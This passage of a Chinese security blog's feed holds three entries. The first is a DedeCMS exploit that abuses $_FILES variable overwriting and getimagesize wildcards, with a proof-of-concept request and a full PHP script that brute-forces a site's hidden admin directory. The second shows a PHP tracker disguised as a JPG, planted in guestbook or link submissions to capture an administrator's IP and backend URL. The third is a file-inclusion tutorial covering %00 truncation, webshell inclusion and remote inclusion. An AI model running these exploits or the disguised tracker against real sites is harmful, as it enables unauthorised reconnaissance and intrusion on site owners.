class="hljs-string">&#x27;_name&#x27;</span>&#125;) || !preg_match(<span class="hljs-string">&quot;#\.#&quot;</span>, $&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;)) )&#123;    <span class="hljs-keyword">if</span>(!defined(<span class="hljs-string">&#x27;DEDEADMIN&#x27;</span>))    &#123;        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Not Admin Upload filetype not allow !&#x27;</span>);    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_size&#x27;</span>&#125;))&#123;    $&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_size&#x27;</span>&#125; = @filesize(<span class="hljs-variable">$$_key</span>);&#125;<span class="hljs-variable">$imtypes</span> = <span class="hljs-keyword">array</span>(    <span class="hljs-string">&quot;image/pjpeg&quot;</span>, <span class="hljs-string">&quot;image/jpeg&quot;</span>, <span class="hljs-string">&quot;image/gif&quot;</span>, <span class="hljs-string">&quot;image/png&quot;</span>,     <span class="hljs-string">&quot;image/xpng&quot;</span>, <span class="hljs-string">&quot;image/wbmp&quot;</span>, <span class="hljs-string">&quot;image/bmp&quot;</span>);<span class="hljs-keyword">if</span>(in_array(strtolower(trim($&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_type&#x27;</span>&#125;)), <span class="hljs-variable">$imtypes</span>))&#123;    <span class="hljs-variable">$image_dd</span> = @getimagesize(<span class="hljs-variable">$$_key</span>);     <span class="hljs-comment">//问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。</span>    <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$image_dd</span>))    &#123;        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Upload filetype not allow !&#x27;</span>);    &#125;&#125;......</code></pre><p>注意<code>$$_key</code>这一句，变量<code>$key</code>取自于<code>$_FILE</code>，由于<code>$_FILE</code>可控自然<code>$key</code>也可控,此处理论上是可以覆盖任意变量，但是前面有个正则判断不能出现<code>cfg_|GLOBALS</code>。(但是应该还可以覆盖其他变量此处感觉还可以深挖)</p><p>本人出发点是找个可以利用<code>&lt;&lt;</code>通配符猜解后台目录，所以只要<code>$$_key</code>参数可控就可以达到目的。</p><p>但在这之前有个<code>if(!defined(&#39;DEDEADMIN&#39;))</code>的判断,这个很好绕过设置<code>tmp_name为0或者1.jpg含.</code> 就可以绕过。</p><p>最后关键的一点就是要让文件存在还和不存在返回不同的内容就要控制type参数了。</p><p>当目录文件存在的时候 返回正常页面。当不存在的时候返回：Upload filetype not allow !</p><h3 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h3><p>文字不好表达，便于理解。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// ./dedecms/favicon.ico</span><span class="hljs-keyword">if</span>(@getimagesize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;poc&#x27;</span>]))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-meta">?&gt;</span>get:http:<span class="hljs-comment">//localhost/test.php?poc=./d&lt;/favicon.ico</span>返回：<span class="hljs-number">1</span>http:<span class="hljs-comment">//localhost/test.php?poc=./a&lt;/favicon.ico</span>返回：<span class="hljs-number">0</span>http:<span class="hljs-comment">//localhost/test.php?poc=./de&lt;/favicon.ico</span>返回：<span class="hljs-number">1</span>http:<span class="hljs-comment">//localhost/test.php?poc=./ded&lt;/favicon.ico</span>返回：<span class="hljs-number">1</span>........</code></pre><h3 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h3><pre><code class="hljs sqf">http:<span class="hljs-comment">//localhost/dedecms/tags.php</span>post:dopost=save&amp;<span class="hljs-variable">_FILES</span>[b4dboy][tmp_name]=./de&lt;/images/admin_top_logo.gif&amp;<span class="hljs-variable">_FILES</span>[b4dboy][<span class="hljs-built_in">name</span>]=<span class="hljs-number">0</span>&amp;<span class="hljs-variable">_FILES</span>[b4dboy][<span class="hljs-built_in">size</span>]=<span class="hljs-number">0</span>&amp;<span class="hljs-variable">_FILES</span>[b4dboy][<span class="hljs-built_in">type</span>]=<span class="hljs-built_in">image</span>/gif</code></pre><p>Common.inc.php 是被全局包含的文件，只要文件php文件包含了Common.inc.php都可以进行测试，以tags.php文件为例</p><p>当目录存在点时候： </p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180226_%E8%A7%A3%E5%86%B3DEDECMS%E5%8E%86%E5%8F%B2%E9%9A%BE%E9%A2%98--%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/01.png" alt="解决DEDECMS历史难题--找后台目录"></p><p>当目录不存在点时候： </p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180226_%E8%A7%A3%E5%86%B3DEDECMS%E5%8E%86%E5%8F%B2%E9%9A%BE%E9%A2%98--%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/02.png" alt="解决DEDECMS历史难题--找后台目录"></p><h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$domain</span>=<span class="hljs-string">&#x27;http://localhost/dedecms/&#x27;</span>;<span class="hljs-variable">$url</span>=<span class="hljs-variable">$domain</span>.<span class="hljs-string">&#x27;/index.php&#x27;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">post</span>(<span class="hljs-params"><span class="hljs-variable">$url</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$cookie</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;    <span class="hljs-variable">$options</span> = <span class="hljs-keyword">array</span>(        CURLOPT_RETURNTRANSFER =&gt; <span class="hljs-literal">true</span>,        CURLOPT_HEADER =&gt; <span class="hljs-literal">true</span>,        CURLOPT_POST =&gt; <span class="hljs-literal">true</span>,        CURLOPT_SSL_VERIFYHOST =&gt; <span class="hljs-literal">false</span>,        CURLOPT_SSL_VERIFYHOST =&gt; <span class="hljs-literal">false</span>,        CURLOPT_COOKIE =&gt; <span class="hljs-variable">$cookie</span>,        CURLOPT_POSTFIELDS =&gt; <span class="hljs-variable">$data</span>,    );    <span class="hljs-variable">$ch</span> = curl_init(<span class="hljs-variable">$url</span>);    curl_setopt_array(<span class="hljs-variable">$ch</span>, <span class="hljs-variable">$options</span>);    <span class="hljs-variable">$result</span> = curl_exec(<span class="hljs-variable">$ch</span>);    curl_close(<span class="hljs-variable">$ch</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;&#125;<span class="hljs-variable">$testlen</span>=<span class="hljs-number">25</span>;<span class="hljs-variable">$str</span>=range(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>);<span class="hljs-variable">$number</span>=range(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$dic</span> = array_merge(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$number</span>);<span class="hljs-variable">$n</span>=<span class="hljs-literal">true</span>;<span class="hljs-variable">$nn</span>=<span class="hljs-literal">true</span>;<span class="hljs-variable">$path</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">while</span>(<span class="hljs-variable">$n</span>)&#123;    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dic</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$v</span>)&#123;        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dic</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$vv</span>)&#123;            <span class="hljs-comment">#echo $v.$vv .&#x27;----&#x27;;</span>            <span class="hljs-variable">$post_data</span>=<span class="hljs-string">&quot;dopost=save&amp;_FILES[b4dboy][tmp_name]=./<span class="hljs-subst">$v</span><span class="hljs-subst">$vv</span>&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif&quot;</span>;            <span class="hljs-variable">$result</span>=post(<span class="hljs-variable">$url</span>,<span class="hljs-variable">$post_data</span>);            <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$result</span>,<span class="hljs-string">&#x27;Upload filetype not allow !&#x27;</span>) === <span class="hljs-literal">false</span>)&#123;                <span class="hljs-variable">$path</span>=<span class="hljs-variable">$v</span>.<span class="hljs-variable">$vv</span>;<span class="hljs-variable">$n</span>=<span class="hljs-literal">false</span>;<span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;            &#125;        &#125;    &#125;&#125;<span class="hljs-keyword">while</span>(<span class="hljs-variable">$nn</span>)&#123;    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dic</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$vvv</span>)&#123;        <span class="hljs-variable">$post_data</span>=<span class="hljs-string">&quot;dopost=save&amp;_FILES[b4dboy][tmp_name]=./<span class="hljs-subst">$path</span><span class="hljs-subst">$vvv</span>&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif&quot;</span>;        <span class="hljs-variable">$result</span>=post(<span class="hljs-variable">$url</span>,<span class="hljs-variable">$post_data</span>);        <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$result</span>,<span class="hljs-string">&#x27;Upload filetype not allow !&#x27;</span>) === <span class="hljs-literal">false</span>)&#123;            <span class="hljs-variable">$path</span>.=<span class="hljs-variable">$vvv</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$path</span> . PHP_EOL;            <span class="hljs-variable">$giturl</span>=<span class="hljs-variable">$domain</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/images/admin_top_logo.gif&#x27;</span>;            <span class="hljs-keyword">if</span>(@file_get_contents(<span class="hljs-variable">$giturl</span>))&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$domain</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>;                <span class="hljs-variable">$nn</span>=<span class="hljs-literal">false</span>;<span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;            &#125;        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180226_%E8%A7%A3%E5%86%B3DEDECMS%E5%8E%86%E5%8F%B2%E9%9A%BE%E9%A2%98--%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/03.png" alt="解决DEDECMS历史难题--找后台目录"></p><p>转载自：<a href="https://xianzhi.aliyun.com/forum/topic/2064">https://xianzhi.aliyun.com/forum/topic/2064</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>访问我的图片就获取你ip和访问地址</title>
    <link href="/p/a23ac9c4.html"/>
    <url>/p/a23ac9c4.html</url>
    
    <content type="html"><![CDATA[<h3 id="新建个名为-htaccess的文件，内容如下"><a href="#新建个名为-htaccess的文件，内容如下" class="headerlink" title="新建个名为.htaccess的文件，内容如下"></a>新建个名为.htaccess的文件，内容如下</h3><p><code>AddHandler application/x-httpd-php .jpg</code></p><h3 id="新建个1-jpg，内容如下"><a href="#新建个1-jpg，内容如下" class="headerlink" title="新建个1.jpg，内容如下"></a>新建个1.jpg，内容如下</h3><a id="more"></a><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_dangerous_words</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;‘&quot;</span>, <span class="hljs-variable">$str</span>);        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;“&quot;</span>, <span class="hljs-variable">$str</span>);        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;《&quot;</span>, <span class="hljs-variable">$str</span>);        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;》&quot;</span>, <span class="hljs-variable">$str</span>);        <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIP</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&#x27;HTTP_CLIENT_IP&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_CLIENT_IP&#x27;</span>);        &#125;        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);        &#125;        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED&#x27;</span>);        &#125;        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>);        &#125;        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED&#x27;</span>);        &#125;        <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ip</span>;    &#125;    <span class="hljs-variable">$ip</span> = getIP();    @<span class="hljs-variable">$referer</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>].<span class="hljs-string">&quot;\r\n&quot;</span>;    <span class="hljs-variable">$ua</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>].<span class="hljs-string">&quot;\r\n\r\n&quot;</span>;    date_default_timezone_set(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);    <span class="hljs-variable">$date_</span> = date(<span class="hljs-string">&quot;Y.m.d,h:i:sa&quot;</span>).<span class="hljs-string">&quot;\r\n&quot;</span>;<span class="hljs-comment">//记录后台地址等信息</span>    <span class="hljs-variable">$hack</span> = <span class="hljs-string">&#x27;date: &#x27;</span>.<span class="hljs-variable">$date_</span>.<span class="hljs-string">&#x27;ip:&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-string">&#x27;referer: &#x27;</span>.<span class="hljs-variable">$referer</span>.<span class="hljs-string">&#x27;ua: &#x27;</span>.<span class="hljs-variable">$ua</span>;    <span class="hljs-variable">$hack</span> = filter_dangerous_words(<span class="hljs-variable">$hack</span>);    <span class="hljs-variable">$op</span> = fopen(<span class="hljs-string">&#x27;hack.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>);    fwrite(<span class="hljs-variable">$op</span>,<span class="hljs-variable">$hack</span>);    fclose(<span class="hljs-variable">$op</span>);<span class="hljs-comment">//伪装成图片</span>    <span class="hljs-variable">$im</span> = imagecreatefromjpeg(<span class="hljs-string">&quot;2.jpg&quot;</span>);<span class="hljs-comment">//注意该目录下，也要有2.jpg这个图片</span>    header(<span class="hljs-string">&#x27;Content-Type: image/jpeg&#x27;</span>);    imagejpeg(<span class="hljs-variable">$im</span>);    imagedestroy(<span class="hljs-variable">$im</span>); <span class="hljs-meta">?&gt;</span></code></pre><h3 id="放个正常图片，名为2-jpg。"><a href="#放个正常图片，名为2-jpg。" class="headerlink" title="放个正常图片，名为2.jpg。"></a>放个正常图片，名为2.jpg。</h3><h3 id="访问http-127-0-0-1-1-jpg"><a href="#访问http-127-0-0-1-1-jpg" class="headerlink" title="访问http://127.0.0.1/1.jpg"></a>访问<a href="http://127.0.0.1/1.jpg">http://127.0.0.1/1.jpg</a></h3><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>在留言板或者申请友链页面填信息，然后提交</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180131_%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80/01.png" alt="访问我的图片就获取你ip和访问地址"></p><p>等管理员在后台审核的时候看到这图片</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180131_%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80/02.png" alt="02"></p><p>此时就会在你该文件的相同目录下生成一个hack.txt</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180131_%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80/03.png" alt="03"></p><p>这样就获取到后台地址了。</p>]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>谈一谈文件包含漏洞</title>
    <link href="/p/4484eea8.html"/>
    <url>/p/4484eea8.html</url>
    
    <content type="html"><![CDATA[<h2 id="什么是文件包含"><a href="#什么是文件包含" class="headerlink" title="什么是文件包含"></a>什么是文件包含</h2><hr><blockquote><p>文件包含这个漏洞，简单来说既是程序猿在开发中为了方便，会将在多个页面重复使用的代码单独写到一个文件中，在需要用到的地方直接包含进来，包含后的文件既相当于将被包含的整个文件内容复制到了包含处。因为在开发中是经常用到的，因此成为了攻击者的目标，便衍生了多种文件包含的攻击。</p></blockquote><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><hr><a id="more"></a><p>先来感受一下，当包含值可被直接控制的情况下是怎么样的如以下代码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);</code></pre><p>可看到以上代码，直接包含的 <code>$file</code> 这种情况下呢，就是可控的情况。</p><blockquote><p>先说一下文件包含的一个要点：文件包含可以包含任意文件，即便被包含的文件并不是与当前编程语言相关，甚至为图片，只要被包含的文件，其内容会被包含文件包含，并以包含文件当前语言执行。</p></blockquote><p>首先在当前文件夹内随便创建任意后缀格式的文件，如：<code>file.txt</code> （就算是图片格式那么效果也是如下）文件内容如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    phpinfo();</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/01.png" alt="谈一谈文件包含漏洞"></p><p>文件包含漏洞在支持包含<code>web</code>应用内的目录的同时也直冲包含当前服务器内的其它文件，如下：<br>尝试包含<code>C盘</code>里的某个内容。如：<code>C:\WINDOWS\system.ini</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/02.png" alt="谈一谈文件包含漏洞"></p><p>可看到是直接被包含进来的。</p><p>那么上面说的是传入的文件值为全部可控的情况下的方法，那么如果程序猿在开发中固定死了所包含的文件后缀的话，怎么办？代码如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] . <span class="hljs-string">&#x27;.php&#x27;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>;    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);</code></pre><p>这种情况下，我们按照上面的方法尝试一下,为了方便看到直观效果，这里<br>是将<code>$file</code>输出了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/03.png" alt="谈一谈文件包含漏洞"></p><p>我们可以看到，如果在程序中固定死了后缀，那么就像上图一样，将会找不到需要包含的文件。可看到最后所包含的文件名为：<code>./include.txt.php</code>。</p><p>因此这就可以使用另一种方法，就是：<code>%00</code>截断。那么<code>%00</code>截断呢，是可以使用在非常多的地方的，这里不多讲。想了解的童鞋可以网上查一查相关资料。</p><p>这里先说一下PHP中使用<code>%00</code>的前提：</p><ol><li>PHP版本 &lt; 5.3 (不包括5.3) ;</li><li>PHP<code>magic_quotes_gpc = off</code>;</li><li>PHP对所接收的参数，如以上代码的<code>$_GET[&#39;file&#39;]</code>未使用<code>addslashes</code>函数</li></ol><p>因为PHP大于等于5.3的版本已经修复了这个问题，如果开启了<code>gpc</code>或者使用了<code>addslashes</code>函数的话则会对其进行转义。<br>首先我们可以试试如果在<code>gpc</code>开启的情况下会出现什么情况（效果与使用函数的为一致）</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/04.png" alt="谈一谈文件包含漏洞"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/05.png" alt="谈一谈文件包含漏洞"></p><p>可以看到了。效果是非常的明显。</p><p>接下来看看在5.3的情况是什么样的</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/06.png" alt="谈一谈文件包含漏洞"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/07.png" alt="谈一谈文件包含漏洞"></p><p>也可以看到。是没有任何效果的。</p><p>因此我们可以得知只要满足以上三种情况，那么就可以使用<code>%00</code>；<br>首先我们将PHP版本更换为5.2，然后在<code>php.ini</code>将 <code>magic_quotes_gpc = on</code>改为<code>magic_quotes_gpc = off</code>之后重启 <code>Apache</code>，在尝试下使用截断。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/08.png" alt="谈一谈文件包含漏洞"></p><p>成功使用截断包含。那么文件包含就只有包含的功能吗？那肯定不是的，既然是文件包含，那么我们可以直接包含一句话。先创建一个文件：<code>shell.txt</code>内容为一句话。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/09.png" alt="谈一谈文件包含漏洞"></p><p>可以看到，拿<code>shell</code>不是什么问题。</p><p>那么这两种包含有什么区别呢？其实是没有区别的，原理都一样，只不过第一种是将后缀一起传入，第二种则在程序内固定死了后缀。但是可以使用<code>%00</code>因为当程序流遇到<code>%00</code>终止符的时候将直接终止。</p><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><blockquote><p>本地文件包含与远程文件包含的原理是相同的，不同点就是前者只能包含服务器内存在的文件，后者则可包含远程服务器内的文件。</p></blockquote><p>远程文件包含的注意点：</p><ol><li>需要 <code>php.ini</code> 内的 <code>allow_url_include = on</code> 以及 <code>allow_url_fopen=on</code></li><li>所需包含的远程文件后缀格式不能以目标服务器的语言相同，如（目标服务器解析PHP代码，那么远程文件后缀格式则不能为 <code>PHP</code> ）</li></ol><p>来解释一下第二点：因为如果你的远程文件是<code>php</code>后缀的话，那么如果你远程文件内容为：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    phpinfo();</code></pre><p>那么在目标服务器内拿到的内容则是你的远程服务器执行<code>phpinfo()</code>后的一个内容，并不是这段代码，因此包含得到的信息并不是目标服务器的而是你远程服务器的。如下：<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/10.png" alt="谈一谈文件包含漏洞"></p><p>这个是我远程机的信息，为php5.6版本，目标机的是5.2版本。接下来包含一下。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/11.png" alt="谈一谈文件包含漏洞"></p><p>可以看到，包含后得到的结果就是我们远程机的，为什么呢？？<br>因为目标服务器包含的代码并不是：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></code></pre><p>而是远程服务器执行完这段代码的源代码，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/12.png" alt="谈一谈文件包含漏洞"></p><p>所以说远程文件包含只有符合了以上两点才能正常包含。<br>先来修改下：</p><ol><li><p>修改配置<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/13.png" alt="谈一谈文件包含漏洞"></p></li><li><p>修改文件后缀<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/14.png" 